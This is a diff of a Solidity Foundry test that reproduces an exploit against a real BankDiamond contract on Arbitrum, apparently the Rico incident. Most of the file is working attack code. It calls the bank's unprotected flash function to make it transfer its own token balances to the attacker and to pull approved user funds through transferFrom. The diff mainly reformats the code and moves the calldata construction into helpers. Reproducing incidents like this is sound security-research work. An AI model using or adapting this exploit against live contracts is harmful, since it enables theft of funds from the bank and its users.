@@ -14,12 +14,12 @@ import "../interface.sol";
 // Vulnerable Contract Code : https://arbiscan.io/address/0x598c6c1cd9459f882530fc9d7da438cb74c6cb3b#code
 
 // @Analysis
-// Post-mortem : 
+// Post-mortem :
 // Twitter Guy : https://twitter.com/0xlouistsai/status/1781845191047164016
-// Hacking God : 
+// Hacking God :
 
 interface IBankDiamond {
-    function flash(address, bytes calldata) external returns(bytes memory result);
+    function flash(address, bytes calldata) external returns (bytes memory result);
 }
 
 contract Rico is Test {
@@ -40,7 +40,9 @@ contract Rico is Test {
     }
 
     function testExploit() public {
-        emit log_named_decimal_uint("Attacker USDC Balance Before exploit", IERC20(USDC_TOKEN).balanceOf(address(this)), 6);
+        emit log_named_decimal_uint(
+            "Attacker USDC Balance Before exploit", IERC20(USDC_TOKEN).balanceOf(address(this)), 6
+        );
 
         // Transfer tokens from BankDiamond to the attacker
         transferTokens(USDC_TOKEN);
@@ -63,21 +65,32 @@ contract Rico is Test {
         swapTokens(ARB_USDC_TOEKN);
 
         // Log balances after exploit
-        emit log_named_decimal_uint("Attacker USDC Balance After exploit", IERC20(USDC_TOKEN).balanceOf(address(this)), 6);
+        emit log_named_decimal_uint(
+            "Attacker USDC Balance After exploit", IERC20(USDC_TOKEN).balanceOf(address(this)), 6
+        );
+    }
+
+    function _getTransferData(address token) internal view returns (bytes memory data) {
+        uint256 tokenBalance = IERC20(token).balanceOf(BankDiamond);
+        data = abi.encodeWithSelector(IERC20.transfer.selector, address(this), tokenBalance);
+    }
+
+    function _getTransferFromData(address token, address user) internal view returns (bytes memory data) {
+        uint256 tokenBalance = IERC20(token).balanceOf(BankDiamond);
+        uint256 tokenAllowance = IERC20(token).allowance(user, BankDiamond);
+        if (tokenBalance >= tokenAllowance) {
+            data = abi.encodeWithSelector(IERC20.transferFrom.selector, user, address(this), tokenBalance);
+        }
     }
 
     function transferTokens(address token) internal {
-        uint256 tokenBalance = IERC20(token).balanceOf(BankDiamond);
-        bytes memory data = abi.encodeWithSignature("transfer(address,uint256)", address(this), tokenBalance);
-        IBankDiamond(BankDiamond).flash(token, data);
+        IBankDiamond(BankDiamond).flash(token, _getTransferData(token));
     }
 
     function transferFromOwner(address owner, address token) internal {
-        uint256 tokenBalance = IERC20(token).balanceOf(BankDiamond);
-        uint256 tokenAllowance = IERC20(token).allowance(owner, BankDiamond);
-        if(tokenBalance >= tokenAllowance) {
-            bytes memory data = abi.encodeWithSignature("transferFrom(address,address,uint256)", owner, address(this), tokenBalance);
-            IBankDiamond(BankDiamond).flash(token, data);
+        bytes memory callData = _getTransferFromData(token, owner);
+        if (callData.length > 0) {
+            IBankDiamond(BankDiamond).flash(token, callData);
         }
     }
 
